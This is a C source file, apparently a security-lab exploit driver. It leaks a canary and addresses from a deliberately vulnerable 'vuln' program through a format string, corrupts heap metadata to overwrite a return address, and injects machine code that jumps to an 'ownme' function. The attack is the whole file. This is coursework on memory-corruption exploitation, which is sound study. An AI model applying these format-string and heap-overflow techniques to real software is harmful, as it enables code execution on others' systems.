#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 100

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

// Beautified print_escaped: print first two character then, gather by 4 bytes
void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   int l=-3;
   fprintf(stderr, "\n%4d:", 0); // empty line
   for (i=0; i < len; i++) {
      if(i%4==2 && i%16==2)
         fprintf(stderr, "\n%4d:", l+=4);
      else if(i%4==2)
         fprintf(stderr, " ");
      fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   void *main_loop2_ebp = (void*)0xbfffefd8; // value of main_loop's ebp from run #2
   void *main_loop2_rdbuf = (void*)0xbfffea40;

   unsigned int offset_main_loop_rdbuf = main_loop2_ebp - main_loop2_rdbuf;

   /*
    * Exploit Idea
    * 1. Create 3 blocks (u, u, p), call each block 1, 2, 3, repectively
    *       Note. block 2's prev->next = RA
    *             block 2's next       = address of user[0] ??
    * 2. Set block 2's inUse to 0 using heap overflow from block 3.
    * 3. Inject the code on to stack.
    * 4. Execute the 'l'
   */

   // Detailed steps
   // 1. Extract runtime information
   put_str("e %431$x %434$x %435$x\n"); // returns the adderss of main_loop()
   send();

   void *main_loop_ra, *main_loop_bp, *canary; // address of main_loop's return address
   get_formatted("%x%x%x", &canary, &main_loop_bp, &main_loop_ra); 
   fprintf(stderr, "driver: Extracted canary: %x main_loop_bp: %x main_loop_ra: %x\n", 
      (unsigned int) canary, 
      (unsigned int) main_loop_bp, 
      (unsigned int) main_loop_ra);

   // 2. Calculate address
   // 2-1. Find the address of where the injected code will be located
   //      This is necessary to return to injected code.
   void *code_loc = main_loop_bp - offset_main_loop_rdbuf + 4;
   fprintf(stderr, "driver: code_loc: 0x%x\n", (unsigned int) code_loc);

   // 2-2. Find address of ownme()
   int offset_main_loop_ra_and_ownme = 1141; // offset from return address to ownme
   void *ownme_addr= (void*)((int)main_loop_ra-offset_main_loop_ra_and_ownme);
   fprintf(stderr, "driver: ownme_addr is %p\n", ownme_addr);

   // 3. Prepare blocks
   // 3-1. Prepare block 1
   put_str("u dummy\n");
   send();
   fprintf(stderr, "driver: Sent block 1, press any key to continue.\n");
   getchar();

   // 3-2. Prepare block 2
   char *ts1 = (char*) &code_loc; 

   void *toSend = main_loop_bp + 0x4 - 0xc - 48;
   char *ts2 = (char*) &toSend;
   // + 0x4 : to get the location of RA
   // - 0xc : to get this location dereferenced when "->next" happens
   // - 48  : to get the RA's location of the main_loop and not main
   //         this value was retrieved from gdb

   size_t sz = 8;
   char *expl = (char *) malloc(sz);
   for(int i = 0; i < 4; i++){
      expl[i] = ts1[i];
      expl[i+4] = ts2[i];
   }

   put_str("u ");
   put_bin((void*)expl, sz);
   put_str("\n");
   send();
   fprintf(stderr, "driver: Sent block 2, press any key to continue.\n");
   getchar();

   free(expl);

   // 3-3. Prepare block 3
   //      Note. this block overwrites the block 2's inUser
   sz = 256 + 4 - 12;
   // + 256 : size of the default block
   // + 4   : to overwrite the first 4 bytes of the next block
   // - 12  : consider the fact that the payload is loaded +12 offset from 
   //         the very start of the block

   expl = (char *) malloc(sz);

   // to avoid confusion of the payload size, include "p " in the binary payload
   expl[0] = 'p';
   expl[1] = ' ';

   // set last 4 bytes to be 0
   for(int i = 4; i > 0; i--){
      expl[sz-i] = 0;
   }
   
   put_bin((void*)expl, sz);
   put_str("\n");
   send();
   fprintf(stderr, "driver: Sent block 3, press any key to continue.\n");
   getchar();

   free(expl);

   // 4. Overflow the heap's current->prev->next and current->next
   //    Now the ret address is &user[0]
   put_str("l ");
   send();
   fprintf(stderr, "driver: Login attempt\n");
   getchar();

   // 5. before calling 'l', inject code on to the stack
   // 5-1. Generate asm code
   /* from as -a --32 jmp_heap_ownme.s (also included in the git)
   1 0000 B8000000   mov  $0x0, %eax
   1      00
   2 0005 FFE0       jmp *%eax
   3   
   */
   char code[] = { 0xB8, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 } ;
   size_t len = 7;
   
   // 5-2. Prepare the code injecting payload
   expl = (char*) malloc(len);
   memset((void*)expl, '\x90', len);
   fprintf(stderr, "driver: exploit size: %d\n", len);

   for(int i = 0; i < len; i++){
      ((char*)expl)[i] = code[i];
   }

   // 5-3. Overwrite the address of ownme, which is dynamically found
   char *tmp = (char*) &ownme_addr;
   for(int i = 0; i < 4; i++){
      ((char*)expl)[i + 1] = tmp[i];
   }
   fprintf(stderr, "driver: Inject code        : Setting values at offset: 0x%x\n", 0);

   // 6. Inject code on to stack
   put_str("u   ");
   put_bin((char*)expl, len);
   put_str("\n");
   send();
   fprintf(stderr, "driver: Code injected\n");

   // 7. Execute q
   put_str("q \n");
   send();
   fprintf(stderr, "driver: Returning from main_loop with q command\n");

   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
